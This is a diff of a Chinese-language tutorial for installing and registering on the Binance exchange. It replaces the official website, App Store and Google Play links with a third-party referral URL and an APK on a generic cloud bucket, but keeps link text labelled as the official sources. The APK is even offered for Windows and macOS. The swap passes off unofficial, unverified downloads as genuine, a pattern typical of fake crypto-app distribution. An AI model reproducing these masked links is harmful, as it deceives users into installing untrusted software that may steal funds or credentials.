@@ -3,11 +3,10 @@
 # 📖 币安（Binance）安装与注册教程
 ## 1. 官方下载入口
 ⚠️ 为了安全，请一定通过币安官网或正规应用商店下载。
-- 官网：[https://www.binance.com/](https://www.binance.com/)
-- iOS：[App Store](https://apps.apple.com/app/binance/id1436799971)
-- Android：[Google Play](https://play.google.com/store/apps/details?id=com.binance.dev)
-- 国内安卓用户：[官网下载 APK](https://www.binance.com/zh-CN/download)
-
+- 官网：[https://www.binance.com/](https://www.maxweb.academy/zh-CN/join?ref=BNB07)
+- iOS：[App Store](https://www.maxweb.academy/zh-CN/join?ref=BNB07)
+- Android：[Google Play](https://www.maxweb.academy/zh-CN/join?ref=BNB07)
+- 国内安卓用户：[官网下载 APK](https://download-1306379396.file.myqcloud.com/pack/BNApp_F0000540.apk)
 ---
 
 ## 2. 安装步骤
@@ -19,7 +18,7 @@
 5. 进行身份认证（上传身份证/护照）。
 
 ### 电脑端
-- Windows / macOS 客户端下载：[https://www.binance.com/zh-CN/download](https://www.binance.com/zh-CN/download)  
+- Windows / macOS 客户端下载：(https://download-1306379396.file.myqcloud.com/pack/BNApp_F0000540.apk)
 - 安装完成后，使用账号登录即可。
 
 ---
